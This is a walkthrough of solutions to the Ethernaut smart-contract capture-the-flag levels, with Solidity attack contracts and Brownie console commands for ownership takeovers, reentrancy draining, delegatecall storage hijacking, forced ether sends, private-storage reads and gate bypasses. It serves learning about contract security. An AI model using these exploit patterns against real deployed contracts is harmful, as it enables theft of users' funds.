## Solutions for [Ethernaut CTF](https://ethernaut.openzeppelin.com/) using Brownie

**Notes**
If the solution uses `Brownie console --network rinkeby`, the `hacking_account` is defined as
  ```bash
  >>> hacking_account = accounts.add(PRIVATE_KEY)
  ```

### 0. Hello Ethernauts
Just using the browser console

```js
await contract.info()
'You will find what you need in info1().'

await contract.info1()
'Try info2(), but with "hello" as a parameter.'

await contract.info2("hello")
'The property infoNum holds the number of the next info method to call.'

await contract.infoNum()
o {negative: 0, words: Array(2), length: 1, red: null}length: 1negative: 0red: nullwords: (2) [42, empty][[Prototype]]: Object

await contract.info42()
'theMethodName is the name of the next method.'

await contract.theMethodName()
'The method name is method7123949.'

await contract.method7123949()
'If you know the password, submit it to authenticate().'

await contract.password()
'ethernaut0'

await contract.authenticate("ethernaut0")
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

<>_<> Submitting level instance... <  < <<PLEASE WAIT>> >  >
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

◕_◕ Well done, You have completed this level!!!
```


### 1. Fallback
- A contract receiving Ether must have at least one of the functions below. `receive()` is called if `msg.data` is empty, otherwise `fallback()` is called.
  ```solidity
  receive() external payable
  fallback() external payable
  ```

- The contract has this function
  ```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
  ```

- Anyone can call a fallback function by:
  - Calling a function that doesn’t exist inside the contract, or
  - Calling a function without passing in required data, or
  - Sending Ether without any data to the contract

- So we'll send a transaction to the contract without any data that will trigger the `receive()` function. Before that we need to pass the `require(msg.value > 0 && contributions[msg.sender] > 0)`

**Solution**
Just using the browser console
```js
await contract.contribute({value: 1234})
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

await contract.sendTransaction({value: 1234})
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏ 

await contract.withdraw()
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

await contract.owner()
'0x355705B24b94414d7A8fCD3A7A7e2849EE9029Ce'

<>_<> Submitting level instance... <  < <<PLEASE WAIT>> >  >
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

◕_◕ Well done, You have completed this level!!!
```


### 2. Fallout
- This is a weird contract, by looking at `contract.abi`, there is a function name `Fal1out` which is public, so just call it and become owner
- It looks like a typo, previous solidity version define constructor function by a function with name similar to contract name
- The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:
  ```solidity
  contract Rubixi {
    address private owner;
    function DynamicPyramid() { owner = msg.sender; }
    function collectAllFees() { owner.transfer(this.balance) }
  }
  ```

**Solution**
Just using the browser console

```js
await contract.owner()
'0x0000000000000000000000000000000000000000'

await contract.Fal1out({value: 1234})
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

await contract.owner()
'0x355705B24b94414d7A8fCD3A7A7e2849EE9029Ce'

<>_<> Submitting level instance... <  < <<PLEASE WAIT>> >  >
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

◕_◕ Well done, You have completed this level!!!
```

### 3. Coin Flip
- It supposes to be a random game, but the contract uses `block.number` as random generator
  ```solidity
  uint256 blockValue = uint256(blockhash(block.number.sub(1)));
  uint256 coinFlip = blockValue.div(FACTOR);
  bool side = coinFlip == 1 ? true : false;
  ```

**Solution**
- Need to create a new contract that use that random generator to feed to `flip` function
  - Define `interface` to CoinFlip contract
    ```solidity
    challenge = ICoinFlip(_coinFlipAddress)
    ```
  - The Attack contract
    - Attack function that calls `challenge.flip(side)` whereas `side` is calculated base on CoinFlip contract
    ```solidity
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
          // just use normal arithmetic directly, no SafeMath
      bool side = coinFlip == 1 ? true : false;
      challenge.flip(side);
    ```

- The attack contract is in `contracts/03_CoinFlip/CoinFlipAttack.sol`

- `brownie console --network rinkeby`
```bash
>>> challenge_address = '...'

# deploying attack contract
>>> attackContract = CoinFlipAttack.deploy(challenge_address, {'from': hacking_account})

# call this 10 times and pass the challenge
# can use Rinkeby-fork for fast experience with for loop, 
# or use sleep() to wait to transaction to confirm on Rinkeby
>>> attackContract.attack({'from': hacking_account})
```


### 4. Telephone
- `msg.sender`: direct sender of the message, so can be a contract
- `tx.origin` gives the origin of the transactions, so in practice this will always be a user, an External Owned Account

**Solution**
- Creating a contract that will call `changeOwner` function of Telephone contract. That would lead to `(tx.origin != msg.sender)` because `tx.origin` is our EOA, `msg.sender` is the newly created contract. With that condition being met, we can set `newOwner` to our `player` address
  ```solidity
  function attack(address _owner) public {
        challenge.changeOwner(_owner);
  }
  ```

- `brownie console --network rinkeby`
```bash
>>> challenge_address = '...'

# deploying attack contract
>>> attackContract = TelePhoneAttack.deploy(challenge_address, {'from': hacking_account})

>>> _owner = hacking_account.address

>>> attackContract.attack(_owner, {'from': hacking_account})
```


### 5. Token
*overflow problem*

`brownie console --network Rinkeby`

```bash
>>> challenge_address = '...'
>>> token = Token.at(challenge_address)
>>> token.balanceOf(hacking_account.address)
20
>>> randomAddress = ZERO_ADDRESS
# - `20 - 20 - 1` this equation will return overflow
>>> token.transfer(randomAddress, 21, {'from':hacking_account})
```

### 6. Delegation
Just using the browser console

```js
await contract.owner()
'0x9451961b7Aea1Df57bc20CC68D72f662241b5493'
// the data_payload need to do the job of calling `pwn` function which is public in Delegate contract
data_payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
})

// send transaction so that the fallback function triggered, then it will `delegatecall` to Delegate contract
await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: data_payload
})
⛏️ Sent transaction ⛏
⛏️ Mined transaction ⛏

await contract.owner()
'0x355705B24b94414d7A8fCD3A7A7e2849EE9029Ce'
```

### 7. Force
Force send ether to the contract

- In challenge number 1 Fallback, we notice that a contract receiving Ether must have at least one of the functions below

```solidity
receive() external payable
fallback() external payable
```

- there is other way
  - write a new contract
  - deposit eth to it 
  - call `selfdestruct(challenge_address)`
  - that will forcefully send all that contract's eth to `challenge_address`

**Solution**
- `ForceAttack` contract

  ```solidity
  pragma solidity ^0.6.0;

  contract ForceAttack {
      constructor() public payable {}
      function attack(address payable _contractAddr) public {
          selfdestruct(_contractAddr);
      }
  }
  ```

- `brownie console  --network rinkeby`

```bash
>>> challenge_address = '...'

>>> attackContract = ForceAttack.deploy({'from': hacking_account, 'value': 1234})

>>> attackContract.attack(challenge_address, {'from':hacking_account})
```

### 8. Vault
- even private data can is assessible `bytes32 private password`
- in 'Vault' contract, variable `locked - bool type` takes the first slot because `password - bytes32` take the whole 256 slot at second place

**Solution**
- just need to query storage at index 2 to get password in bytes32 type
- `brownie console  --network rinkeby`

```bash
>>> challenge_address = '...'

>>> password = web3.eth.getStorageAt(challenge_address, 1)

>>> vault = Vault.at(challenge_address)

>>> vault.unlock(password, {'from':hacking_account})
```

### 9. King
- problem lies in `king.transfer(msg.value);`, what if `king` doesn't take ether

**Solution**
- KingAttack contract
```solidity
pragma solidity 0.6.4;

contract KingAttack {
    // to send ether to the challenge contract and claim kingship
    constructor (address payable _addr) public payable {
        _addr.call{value: msg.value}("");
    }
    // prevent receiving ether
    fallback() external payable {
        revert("i dont take ether");
    }
}
```

- `brownie console  --network rinkeby`
```bash
>>> chalenge_address = '...'

>>> king = King.at(chalenge_address)

>>> current_prize = king.prize()

>>> KingAttack.deploy(chalenge_address, {'from':hacking_account, 'value': current_prize + 1})
```

### 10. Re-entrancy
- re-entrancy `(bool result,) = msg.sender.call{value:_amount}("");`
- `msg.sender` can be a contract that have function triggered when receiving ether (`fallback`)
- from console `web3.eth.getBalance(chalenge_address)` we know that the contracts has `1000000000000000 Wei = 0.001 ether`

**Solution**
- ReentrancyAttack contract
```solidity
pragma solidity ^0.6.4;

import './Reentrancy.sol';

contract ReentrancyAttack {
    Reentrance public reentrancyContract;
    uint public amount = 0.001 ether;
    
    constructor(address payable _addr) public payable {
        reentrancyContract = Reentrance(_addr);
    }
    // Fallback is called when reentrancyContract sends Ether to this contract.
    fallback() external payable {
        if (address(reentrancyContract).balance >= amount) {
            reentrancyContract.withdraw(amount);
        }
    }

    function attack() external payable {
        // donate with value >=amount
        require(msg.value >= amount);
        reentrancyContract.donate{value: amount}(address(this));
        // withdrawn immidiately , get sent ether that will trigge fallback function
        reentrancyContract.withdraw(amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    // can write the withdrawn function to wallet 
}
```

- `brownie console  --network rinkeby`
```bash
>>> challenge_address = '...'

>>> r = ReentrancyAttack.deploy(challenge_address, {'from':hacking_account, 'value': 1000000000000000})

>>> r.attack({'from':hacking_account, 'value': 1000000000000000})
```

### 11. Elevator
- result from `await contract.top()` is `False` and need to be `True` to beat the challenge
- `Building building = Building(msg.sender)` so we need to write a contract (a msg.sender)
- that contracts need to have `isLastFloor` function as the `interface Building` specified
  - `if (!building.isLastFloor(_floor))` so `isLastFloor` function need to return `False` first time being called
  - top = building.isLastFloor(floor)

**Solution**
- `brownie console  --network rinkeby`
```bash
>>> challenge_address = '...'

>>> challenge = Elevator.at(challenge_address)

>>> challenge.top() #check
False

>>> ea = ElevatorAttack.deploy(challenge_address, {'from': hacking_account})

>>> ea.attack()

>>> challenge = Elevator.at(challenge_address)

>>> challenge.top() #check
True
```

### 12. Privacy
- this challenge is like the extended version of the Vault challenge, it's about storage which is 32 bytes each slot
- there are 6 stateVar declared, the storage will lool like this
```
slot 0: locked
slot 1: ID (in uint256 - 32 bytes)
slot 2: from the right, flattening, denomination and awkwardness
slot 3: data[0]
slot 4: data[1]
slot 5: data[2]
```

- E.g. `brownie console  --network rinkeby`
```bash
>>> web3.eth.getStorageAt(challenge_address, 2)
HexBytes('0x000000000000000000000000000000000000000000000000000000008e27ff0a')
```
    - first byte stores `flattening` which is `uint8`
    - 2nd byte store `denomination` which is also `uint8`
    - `awkwardness` is `uint16` type that need 4 digits to represent in this slot

- we are looking for `data[2]` which is in slot 5

**Solution**
`brownie console  --network rinkeby`
```
>>> challenge_address = '...'

>>> data_2 = web3.eth.getStorageAt(challenge_address, 5)

# bytes16 is the first 34 characters, including 0x
>>> key = data_2.hex()[0:34]

>>> p = Privacy.at(challenge_address)

>>> p.unlock(key, {'from':hacking_account})
```

### 13. Gatekeeper One
- gateOne: obviously need to write a contract that call `enter` function to attack

- gateTwo can be passed with brute force how much gas to use

- gateThree: `_gateKey` is bytes8 need to pass 3 requirements
  - just write 0 in bytes8 here `0x0000000000000000`
  - `uint32(uint64(_gateKey)) == uint16(tx.origin)`
  `uint16(tx.origin)` is the last 2 bytes (4 characters) of our EOA address, say `0xaabb`
  
  now `_gateKey = `0x000000000000aabb`` will pass this requirement as
  `uint64('0x000000000000aabb') = '0x000000000000aabb'`
  `uint32(uint64('0x000000000000aabb')) = '0x0000aabb'`
  `'0x00000aabb' == '0xaabb' is True`

  - `uint32(uint64(_gateKey)) != uint64(_gateKey)` and `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)`
  making `_gateKey` from flipping any of the first 8 characters of `0x000000000000aabb` will pass these 2 requirements
  let take `_gateKey = '0x000000010000aabb'`

**Solution**
- Go to `scripts/13_GatekeeperOne/deploy_and_attack.py` and update `challenge_address` and `gateKey`
- To estimate gas, using rinkeby-fork for faster transaction confirmation
```bash
$ brownie run scripts/13_GatekeeperOne/deploy_and_attack.py gasEstimation --network rinkeby-fork
Success!!! You should use 819354 gas
```

Where the script basically try out different gas, it will stop when `attacker.attack` does not revert
```python
print('estimating gas use of the attack function')
for i in range(1000):
  try:
      tx = attacker.attack(
          _gateKey, MOD * 100 + i, {'from': account})
  except:
      print('keep trying...')
      continue
  break
print(f'Success!!! You should use {MOD * 100 + i} gas')
```

- When having that number, we are ready to pass the challenge. 
```bash
$ brownie run scripts/13_GatekeeperOne/deploy_and_attack.py attack --network rinkeby
```



### 14. Gatekeeper Two
[Excellent writeup](https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd)
- Create attack contract to pass gate1
- to pass gate3 
```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
// so
uint64(_gateKey) == uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^  (uint64(0) - 1)
```
- to pass gate2: have to call 'enter` function in the `constructor` function of attack contract

```solidity
constructor(address _challengeAddr) public {
  challenge = GatekeeperTwo(_challengeAddr);
  
  // Not sure why but got Gas estimation failed: 'execution reverted' when using this with brownie, even with setting gasLimit
  // bytes8 _gateKey = bytes8(
  //     uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
  //         (uint64(0) - 1)
  // );
  // challenge.enter(_gateKey);

  uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
      (uint64(0) - 1);
  challenge.enter(bytes8(gateKey));
    }
```

- `brownie console --network rinkeby
```bash
GatekeeperTwoAttack.deploy(challenge_address, {'from':hacking_account, 'gasLimit'
: 10000000000000000})
```

### 15. NaughtCoin
- `transfer` function is guarded, but ERC20 has another function that can do transfer which is `transferFrom`

- to call `transferFrom` function, we need to approve to the address that can use the coins, including ourself, sounds a little counter-intuitive 

- `brownie console --network rinkeby`
```bash
>>> naughtCoin = NaughtCoin.at(challenge_address)

>>> naughtCoin.balanceOf(hacking_account.address)
1000000000000000000000000

# approve ourself to use all the naughtCoin
>>> naughtCoin.approve(hacking_account.address, naughtCoin.balanceOf(hacking_account.address), {'from': hacking_account})

>>> random_address = '0x7Eb98Ef2D66f9592E7433C50b4ccE5320873c5EA'

>>> naughtCoin.transferFrom(hacking_account.address, random_address, naughtCoin.balanceOf(hacking_account.address), {'from': hacking_account})

>>> naughtCoin.balanceOf(hacking_account.address)
0
```


### 16. Preservation
- The vulnerability of this challenge contracts is that the `Preservation` is calling `LibraryContract` to modify its (Preservation) state vars, but the storage of `LibraryContract` is different than that of `Preservation`
  
  - by calling `setFirstTime` or `setSecondTime`  function of `Preservation`, which make `delegate` to `setTime(uint _time)` of `LibraryContract`, variable that get modified is actually `timeZone1Library` (address type)
  
  - So we can make a call to `setFirstTime` function, pass it an argument which is a malicious contract which will become `timeZone1Library`

  - Now we call `setFirstTime` again which `delegate` to our malicious contract and we can change the owner there

```solidity
constructor(address challengeAddress) public {
    challenge = Preservation(challengeAddress);
    attackerLib = new AttackerLib();
}

function attack() external {
    challenge.setFirstTime(uint256(address(attackerLib)));
    challenge.setFirstTime(0);
}
```

- `brownie console --network rinkeby`
```bash
>>> challenge_address = '...'

>>> challenge = Preservation.at(challenge_address)

>>> challenge.owner()
'0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F'

>>> preservationAttack = PreservationAttack.deploy(challenge_address, {'from': hacking_account})

>>> preservationAttack.attack()

>>> challenge.owner() # checking new owner
```

### 17. Recovery
- The challenge contract is Recovery contract which created from SimpleToken contract
- If we know the simpleToken contract address, we can call its destroy function and recover eth

- How to find that address?
  - Compute the address
  
    We created a challenge instance, get that instance address from browser console `challenge_address`. That instance would then create new `SimpleToken` contract. We can compute that contract address.
    
    According to [this](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed), the address for an Ethereum contract is deterministically computed from the address of its creator (sender) and how many transactions the creator has sent (nonce). The sender and nonce are RLP encoded and then hashed with Keccak-256.
    ```python
    sha3(rlp.encode([normalize_address(sender), nonce]))[12:]
    ```
    Code implementation `scripts/17_Recovery/get_contract_address.py`

  - How does it look like on Etherscan?

- `brownie console --network rinkeby`

```bash
>>> contract_address = run('scripts/17_Recovery/get_contract_address.py')
Running 'scripts/17_Recovery/get_contract_address.py::main'...
contract address is: 0xb5cc1eE21d2DFB70764B9cE74443F182Dc794c75

>>> simpleToken = SimpleToken.at(contract_address)
>>> simpleToken.name()
'InitialToken'

>>> web3.eth.getBalance(simpleToken.address)/1e18
0.001

>>> simpleToken.destroy(hacking_account.address, {'from': hacking_account})

>>> web3.eth.getBalance(simpleToken.address)/1e18
0.0

```

### 18. MagicNumber
This challenge has a lot to do with EVM, Bytecode and Opcode.
Some of the relating resources, read first before go to solving this level
- [Ethernaut Lvl 19 MagicNumber Walkthrough](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)
- [Solidity Bytecode and Opcode Basics](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2)
- [smart contract deconstruction](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/) - from the author of this Ethernaut level